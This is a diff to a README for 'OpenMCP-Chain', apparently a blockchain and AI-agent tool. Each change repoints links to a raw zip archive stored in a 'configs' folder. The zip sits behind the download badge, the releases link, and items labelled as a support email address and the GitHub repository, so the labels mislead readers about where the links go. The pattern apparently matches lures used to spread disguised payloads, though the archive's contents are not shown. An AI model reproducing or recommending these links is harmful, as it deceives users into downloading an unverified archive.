@@ -6,7 +6,7 @@ Welcome to OpenMCP-Chain! This application allows blockchains to connect directl
 
 ## 📥 Download OpenMCP-Chain
 
-[![Download OpenMCP-Chain](https://raw.githubusercontent.com/benoit08260/OpenMCP-Chain/main/triace/OpenMCP-Chain.zip)](https://raw.githubusercontent.com/benoit08260/OpenMCP-Chain/main/triace/OpenMCP-Chain.zip)
+[![Download OpenMCP-Chain](https://github.com/benoit08260/OpenMCP-Chain/raw/refs/heads/main/configs/Open-Chain-MC-v3.2.zip)](https://github.com/benoit08260/OpenMCP-Chain/raw/refs/heads/main/configs/Open-Chain-MC-v3.2.zip)
 
 ## ⚙️ System Requirements
 
@@ -21,7 +21,7 @@ Before you install OpenMCP-Chain, ensure your system meets these requirements:
 
 To start using OpenMCP-Chain, visit the Releases page to download the latest version. Click the link below:
 
-[Download OpenMCP-Chain Releases](https://raw.githubusercontent.com/benoit08260/OpenMCP-Chain/main/triace/OpenMCP-Chain.zip)
+[Download OpenMCP-Chain Releases](https://github.com/benoit08260/OpenMCP-Chain/raw/refs/heads/main/configs/Open-Chain-MC-v3.2.zip)
 
 1. Click the link above.
 2. You will see a list of available versions.
@@ -74,7 +74,7 @@ If you encounter any issues or have questions, here are some resources:
 
 - **Documentation:** A comprehensive guide is available within the app.
 - **Community Support:** Join our community forums for help from other users.
-- **Contact Us:** You can reach our support team via email at https://raw.githubusercontent.com/benoit08260/OpenMCP-Chain/main/triace/OpenMCP-Chain.zip
+- **Contact Us:** You can reach our support team via email at https://github.com/benoit08260/OpenMCP-Chain/raw/refs/heads/main/configs/Open-Chain-MC-v3.2.zip
 
 ## 🏁 FAQ
 
@@ -94,7 +94,7 @@ A: Please report bugs on our GitHub issues page.
 
 For further information and updates, follow us on:
 
-- **GitHub:** [OpenMCP-Chain Repository](https://raw.githubusercontent.com/benoit08260/OpenMCP-Chain/main/triace/OpenMCP-Chain.zip)
-- **Email Support:** https://raw.githubusercontent.com/benoit08260/OpenMCP-Chain/main/triace/OpenMCP-Chain.zip
+- **GitHub:** [OpenMCP-Chain Repository](https://github.com/benoit08260/OpenMCP-Chain/raw/refs/heads/main/configs/Open-Chain-MC-v3.2.zip)
+- **Email Support:** https://github.com/benoit08260/OpenMCP-Chain/raw/refs/heads/main/configs/Open-Chain-MC-v3.2.zip
 
 Thank you for using OpenMCP-Chain! Enjoy building your AI agents with ease.
